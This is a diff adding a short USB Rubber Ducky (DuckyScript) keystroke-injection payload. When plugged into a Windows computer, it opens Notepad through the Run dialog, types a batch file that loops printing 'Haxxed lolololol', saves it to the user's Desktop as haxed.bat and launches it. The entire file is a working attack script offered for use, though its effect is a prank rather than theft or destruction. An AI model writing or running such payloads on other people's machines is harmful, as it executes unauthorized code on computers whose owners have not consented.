@@ -1,0 +1,25 @@
+REM Author: Matt Lombana
+REM Name: YouveBeenHacked.txt
+REM Purpose: run a script to let people know they've been hacked
+REM Encoder V????
+DEFAULT_DELAY 75
+DELAY 2000
+GUI r
+DELAY 1000
+STRING notepad.exe
+DELAY 500
+ENTER
+DELAY 1000
+STRING :loop
+ENTER
+STRING echo "Haxxed lolololol"
+ENTER
+STRING goto loop
+CONTROL s
+STRING %userprofile%\Desktop\haxed.bat
+DELAY 1000
+ENTER
+GUI r
+DELAY 1000
+STRING %userprofile%\Desktop\haxed.bat
+ENTER
